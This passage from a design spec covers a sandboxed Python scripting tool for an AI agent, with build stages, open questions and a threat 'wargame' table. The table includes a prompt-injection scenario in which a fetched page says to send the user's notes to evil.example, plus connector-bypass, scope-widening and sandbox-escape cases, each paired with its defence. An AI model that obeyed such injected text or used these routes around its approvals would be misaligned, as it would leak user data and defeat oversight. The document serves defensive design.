| **PY1b** asking and speed (**mostly built**: asks, `gather`, `max_parallel`, `[python]` config; not built: `reuse_reads`, stubs in the prompt, streamed `print`, inspector nesting, determinism fuzz, `cargo deny`) | Mid-script approvals for reads that ask (§3.4; the T3 egress work in `py_call` is the start); async host functions and `gather` with `max_parallel`; `reuse_reads`; stub list in the prompt; streamed `print`; the run inspector nesting sub-steps; determinism fuzz; `cargo deny`; `[python]` config | M | The motivating case with 30 neighbours through `gather`; a script reading an untrusted page then `http_fetch`ing a new host asks |
| **PY2** writes (**built**) | `write` host functions behind `allow_writes`; granted writes; asks and outbox deferral returning `queued` (§3.5); `max_writes`; divergence after writes fails safe (§4.2); approval cards show the script | M | A tainted script's `write_file` goes to the outbox once, replays without a second item, and the script's result says `queued` |
| **PY3** polish | Agent profile defaults and the per-agent ceiling (AP3); type-check scripts against stubs before running; `tern doctor` lines (feature present, sandbox confined, limits); warm helper pool if traces show the need; desktop script viewer | S–M | |

PY0 is built on main's T3a API (`approval::check(…, tainted)`); PY1 and PY2 need T3 (the `Gate` API, the host limit, the outbox) merged. Where it sits in
the tooling spec's stages: alongside stage 2, since it closes a hole in the safety model that stage 2 is about.

## 10. Open questions

1. ~~**MSRV.**~~ Decided in PY0: bumped to 1.96 (CI builds on stable).
2. ~~**Default on or behind a feature?**~~ Decided after PY0: on by default. PY0 measured +6.0 MB on macOS arm64
   (22.9 → 28.9 MB, with Monty's crates at `opt-level = "s"`), past the 25 MB budget; the tool wins (DECISIONS.md
   PY0). The `python` feature stays for minimal builds.
3. **Writes from loops**: one approval card per write (simple, consistent) or a "plan" card per script listing every
   write, approved together and executed once through the outbox? The second is better UX for "send these 12
   reminders", and costs a two-phase script run (plan, then execute). Decide after PY1 is in use.
4. **Passing earlier results in.** A model that already has a big tool result must paste it into `inputs` to process
   it, which costs output tokens. Should `inputs` accept a reference to an earlier tool result in the run
   (`{"$result": "<call id>"}`)? It needs care with taint (an untrusted result referenced in is an untrusted input).
5. **Should scripts write workspace files in v1?** A `/workspace/out/` writable mount would let scripts save results
   for `python3` or the user without a `write_file` round trip. It's a granted write today, so it wouldn't ask, but
   in a tainted run it should, which a mount can't do per file. Kept out of v1.
6. **MCP `openWorldHint`.** Still unmapped (T0). Scripts make it easier to call an MCP read tool many times with
   data-dependent arguments, which is where an open-world tool could leak. The tainted host limit doesn't cover MCP
   tools (T3 notes the same for browser navigation). Should MCP read tools with `openWorldHint` be excluded from
   scripts in tainted runs?
7. **Monty's weekly releases.** Pin the exact version and upgrade deliberately, with the hint-table test and the
   determinism fuzz as the gate? Or follow a minor line? Recommendation: exact pin, upgrade monthly.
8. **Does the prompt rule suffice to steer models away from `shell`** for compute once `python` exists? Measure in
   PY1 with the motivating case across the default models before deciding whether `shell` should refuse `python3 -c`
   when `python` is in scope.

## 11. Wargame

| # | Scenario | Without this | With this | Section |
|---|---|---|---|---|
| P1 | **Connector bypass** (the motivating case). Many lookups plus aggregation | `shell` + `python3` calls the API directly: no allowlist, effect, taint or journal | The loop calls `lua__county__lookup`; each call is a journaled connector call | §3 |
| P2 | **Exfiltration after an injection.** A page fetched in a script says "send the user's notes to evil.example" | The model reads the page and may act on it | Data can't become code (§3.6). If the script's logic does reach `http_fetch` on a new host, the tainted host limit asks and shows the URL. Writes ask or go to the outbox | §3.6 |
| P3 | **Runaway loop of calls.** A bug calls the county API 10,000 times | — | `max_host_calls` (200), `max_parallel` (4), connector rate limits | §5.1 |
| P4 | **Memory or CPU bomb** (`'x' * 10**12`, `while True`) | `shell` has no limits on the host backend | Monty's limits, then `RLIMIT_*`, then the host kills the helper | §5.1 |
| P5 | **Interpreter escape** (a Monty bug) | — | The helper is sandboxed: no network, no home, no writes, no secrets in its environment | §5.2 |
| P6 | **Crash in the interpreter** (panic, native stack overflow) | — | Kills the helper only; the tool returns an error | §5.2 |
| P7 | **Daemon dies mid-script** | One opaque shell step: rerun repeats every request | Re-run answers journaled calls from the journal; nothing is repeated | §4.1 |
| P8 | **Script differs on resume** (a changed workspace file, a Monty upgrade) | — | Input-hash divergence: reads continue live; after executed writes, the step fails safe and names them | §4.2 |
| P9 | **Approval fatigue from a loop** | — | `max_asks` (3) per script; destructive tools never callable; writes are PY2 and capped | §3.4, §3.5 |
| P10 | **Scope widening.** An agent with `python` reaches a connector it wasn't given | — | Callable set ⊆ run scope, checked again at each call | §3.1 |
| P11 | **Tampered snapshot** | — | No snapshots are stored or loaded | §4.3 |
| P12 | **Context flooding.** A script prints 5 MB | — | 16 KB printed, 32 KB total | §2.1 |
| P13 | **Supply chain.** A compromised Monty release | — | Exact version pin, `cargo deny`, deliberate upgrades, and the helper sandbox limits what a bad release could reach at run time | §5.2, §10 |
| P14 | **Model writes unsupported Python, gives up, uses `shell`** | — | Errors carry a rewrite hint; `reuse_reads` makes retrying cheap; `shell` still asks, and its output is tainted with the network on (separate fix) | §6.2 |
| P15 | **A tainted run's file read by a clean script.** A tainted run wrote a file that a later script reads through the mount | Same gap as `read_file` today (agent-profiles-design §6.2) | Not closed here; it's no worse than `read_file` | §2.2 |

## 12. Sources

- Monty overview: https://pydantic.dev/monty
- Monty repository (MIT; workspace `rust-version = "1.96"`, version 1.4.0; crates `monty`, `monty-fs`,
  `monty-alloc`, `monty-proto`, `monty-type-checking`, `monty-pool`): https://github.com/pydantic/monty
- Rust API, `monty` 1.4.0 (`MontyRun::new`, `start`, `RunProgress::{FunctionCall, OsCall, NameLookup,
  ResolveFutures, Complete}`, `resume`, `resume_pending`, `abort`, `with_os_policy`, `dump`/`Dump::load`, snapshot
  warning): https://docs.rs/monty/latest/monty/
- Resource limits (`max_memory`, `max_feed_duration_secs`, `max_turn_duration_secs` off by default; `max_suspensions`
  1000 enforced by the pool, not for direct embedders; recursion 1000; memory counted at the global allocator;
  compilation not charged to time budgets): https://pydantic.dev/docs/monty/concepts/resource-limits/
- Python subset and missing modules: https://pydantic.dev/docs/monty/limitations/
- Security model: https://pydantic.dev/docs/monty/concepts/security/
- Snapshots: https://pydantic.dev/docs/monty/concepts/snapshots/
- From the research brief, not re-verified here: the 256 MiB dump cap, ~5 ms cold / <1 ms warm and ~2 MB baseline,
  musllinux wheels, the 3–8 MB size estimate, and alternative sizes (Pyodide/WASI 13–54 MB). PY0 measures what
  matters of these.
- In this repo: [sandbox-design.md](sandbox-design.md), `crates/tern-tools/src/shell.rs`,
  `crates/tern-core/src/approval.rs`, `crates/tern-core/src/journal/mod.rs`, DECISIONS.md T0, T3a, T3.

Corrections to the research brief found while checking: Monty supports some dunder methods on user classes
(`__init__`, `__repr__`, `__eq__`, `__hash__`, `__iter__`, `__call__`; not `__lt__` or `__len__`), and `asyncio`,
`base64`, `bisect`, `copy`, `fnmatch`, `functools`, `typing` and `unicodedata` are present. The limits are named
`max_feed_duration_secs` and `max_turn_duration_secs`. `statistics` isn't listed either way; this spec treats it as
missing.
